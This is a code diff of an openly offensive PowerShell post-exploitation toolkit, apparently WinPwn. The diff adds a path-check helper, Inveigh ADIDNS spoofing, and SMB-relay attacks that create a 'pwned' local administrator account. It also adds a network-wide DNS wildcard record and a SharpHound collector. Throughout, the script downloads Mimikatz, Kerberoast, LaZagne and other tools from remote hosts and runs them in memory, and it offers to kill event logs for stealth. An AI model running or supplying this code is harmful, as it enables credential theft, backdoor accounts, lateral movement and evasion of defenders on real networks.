@@ -33,36 +33,8 @@ function dependencychecks
 
         #Proxy Detect #1
         proxydetect
-        
+        pathcheck
         $PSVersion=$PSVersionTable.PSVersion.Major
-        $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-        Write-Host 'Current Path is: '$currentPath''
-        
-        Write-Host -ForegroundColor Yellow 'Creating Log Folders in '$currentPath' directory:'
-        
-        if (Test-Path $currentPath\LocalRecon\)
-        {
-            Write-Host -ForegroundColor Red ''$currentPath\Localrecon' already exists'
-        }
-        else {mkdir $currentPath\LocalRecon\}
-        
-        if (Test-Path $currentPath\DomainRecon\)
-        {
-            Write-Host -ForegroundColor Red ''$currentPath\Domainrecon' already exists'
-        }
-        else {mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
-        
-        if (Test-Path $currentPath\LocalPrivEsc\)
-        {
-            Write-Host -ForegroundColor Red ''$currentPath\LocalPrivEsc\' already exists'
-        }
-        else {mkdir $currentPath\LocalPrivEsc\}
-        
-        if (Test-Path $currentPath\Exploitation\)
-        {
-            Write-Host -ForegroundColor Red ''$currentPath\Exploitation\' already exists'
-        }
-        else {mkdir $currentPath\Exploitation\}
         
         write-host "[?] Checking for Default PowerShell version ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
         
@@ -94,6 +66,45 @@ function dependencychecks
         write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1
 }
 
+pathCheck
+{
+<#
+        .DESCRIPTION
+        Checks for correct path dependencies.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    #Dependency Check
+        $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+        Write-Host 'Current Path is: '$currentPath''
+        
+        Write-Host -ForegroundColor Yellow 'Creating Log Folders in '$currentPath' directory:'
+        
+        if (Test-Path $currentPath\LocalRecon\)
+        {
+            Write-Host -ForegroundColor Red ''$currentPath\Localrecon' already exists'
+        }
+        else {mkdir $currentPath\LocalRecon\}
+        
+        if (Test-Path $currentPath\DomainRecon\)
+        {
+            Write-Host -ForegroundColor Red ''$currentPath\Domainrecon' already exists'
+        }
+        else {mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
+        
+        if (Test-Path $currentPath\LocalPrivEsc\)
+        {
+            Write-Host -ForegroundColor Red ''$currentPath\LocalPrivEsc\' already exists'
+        }
+        else {mkdir $currentPath\LocalPrivEsc\}
+        
+        if (Test-Path $currentPath\Exploitation\)
+        {
+            Write-Host -ForegroundColor Red ''$currentPath\Exploitation\' already exists'
+        }
+        else {mkdir $currentPath\Exploitation\}
+
+}
 
 
 function isadmin
@@ -110,19 +121,72 @@ function Inveigh {
         Author: @securethisshit
         License: BSD 3-Clause
     #>
-       
-    if (isadmin)
-    {
-            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y;}'
+    pathcheck
+    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
+    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+    {   
+        if (isadmin)
+        {
+                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+        }
+        else 
+        {
+               invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+        }
     }
-    else 
+    else
     {
-           invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y;}'
+        if (isadmin)
+        {
+                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+        }
+        else 
+        {
+               invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+        }
     }
-    #TODO: Inveigh SMB Relay Attack?
-    #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh-Relay.ps1')
+
+    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
+    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
+    {
+        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1'');WinPwn;}'
+        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
+        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
+        $Wcl = new-object System.Net.WebClient
+        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh-Relay.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBClient.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBEnum.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBExec.ps1")
+
+        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session
+
+        Write-Host "You can now check your sessions with ´Get-Inveigh -Session´ and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation"
+    }
 }
 
+
+function adidnswildcard
+{
+    <#
+    .DESCRIPTION
+        Starts Inveigh in a parallel window.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    pathcheck
+    $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
+    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+    {
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Powermad.ps1")
+        New-ADIDNSNode -Node * -Tombstone -Verbose
+        Write-Host -ForegroundColor Red "Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests"
+        Write-Host -ForegroundColor Yellow "Starting Inveigh to capture all theese mass hashes:"
+        Inveigh
+    }
+           
+}
 
 function sessionGopher {
 <#
@@ -131,6 +195,7 @@ function sessionGopher {
         Author: @securethisshit
         License: BSD 3-Clause
     #>
+    pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1')
     $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
@@ -173,6 +238,7 @@ function Mimikatzlocal {
         License: BSD 3-Clause
     #>
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     if (isadmin)
     {
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
@@ -214,7 +280,8 @@ function localreconmodules
         Author: @securethisshit
         License: BSD 3-Clause
     #>
-            #Local Reconning
+    #Local Reconning
+            pathcheck
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
@@ -268,6 +335,7 @@ function jaws
         License: BSD 3-Clause
     #>
             #Local Recon / Privesc
+            pathcheck
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
@@ -285,6 +353,7 @@ function domainreconmodules
     #>
             #Domain / Network Reconing
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+            pathcheck
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
             $domain_Name = Get-NetDomain
@@ -355,6 +424,26 @@ function domainreconmodules
 }
 
 
+function sharphound
+{
+<#
+        .DESCRIPTION
+        Downloads Sharphound.exe and collects All AD-Information for Bloodhound.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    #Domain Recon / Lateral Movement Phase
+    $Wcl = new-object System.Net.WebClient
+    $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -Outfile $currentPath\Domainrecon\Sharphound.exe
+    
+    Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
+    .\DomainRecon\Sharphound.exe -c All
+
+}
+
 function privescmodules
 {
 <#
@@ -365,6 +454,7 @@ function privescmodules
     #>
     #Privilege Escalation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
@@ -403,6 +493,7 @@ function lazagnemodule
     #>
     #Privilege Escalation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip' -Outfile $currentPath\Lazagne.zip
     Unzip "$currentPath\Lazagne.zip" "$currentPath\Lazagne"
     Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
@@ -425,6 +516,7 @@ function latmov
         License: BSD 3-Clause
     #>
     #Lateral Movement Phase
+    pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1')
@@ -479,6 +571,7 @@ function latmov
 function empirelauncher
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-WmiCommand.ps1')
     #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1') maybe an alternative later on.
     if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
@@ -538,6 +631,7 @@ function shareenumeration
     #>
     #Enumeration Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
     Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
     Invoke-FileFinder >> $currentPath\SensitiveFiles.txt
@@ -554,22 +648,23 @@ function groupsearch
     #>
     #Enumeration Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
             {
                 $username = Read-Host -Prompt 'Please enter a username to search for: (without domain-name)'
-                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administratoren,Remotedesktopbenutzer)'
+                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                Find-GPOLocation -GroupName $group -UserName $username >> $currentPath\Groupsearches.txt
+                Get-DomainGPOUserLocalGroupMapping -LocalGroup $group -UserName $username >> $currentPath\Groupsearches.txt
             }
-            $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administratoren,Remotedesktopbenutzer)'
-
-            Write-Host -ForegroundColor Yellow 'Searching...:'
-            Find-GPOLocation -GroupName $group -UserName $env:UserName
-            Find-GPOLocation -GroupName $group -UserName $env:UserName >> $currentPath\Groupsearches.txt
-            Write-Host -ForegroundColor Yellow "Systems saved to >> $currentPath\Groupsearches.txt:"
-            $rdp = Read-Host -Prompt 'Do you want to search for more Systems/Groups? (yes/no)'
+            else
+            {
+                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
+                Write-Host -ForegroundColor Yellow 'Searching...:'
+                Get-DomainGPOUserLocalGroupMapping -LocalGroup $group -UserName $env:UserName >> $currentPath\Groupsearches.txt
+                Write-Host -ForegroundColor Yellow "Systems saved to >> $currentPath\Groupsearches.txt:"
+            }
 }
 
 function proxydetect
@@ -582,6 +677,7 @@ function proxydetect
     #>    
     #Proxy Detect #1
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     Write-Host -ForegroundColor Yellow 'Searching for network proxy...'
 
     $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
@@ -613,6 +709,7 @@ function kerberoasting
 {
     #Exploitation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
     Write-Host -ForegroundColor Red 'Kerberoasting active:'
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
@@ -637,11 +734,10 @@ function WinPwn
     }
     Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
     
-            
+    dependencychecks        
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1')
       
-    dependencychecks
     if (isadmin)
     {
         $stealth = Read-Host -Prompt 'Kill event Logs for stealth? (yes/no)'
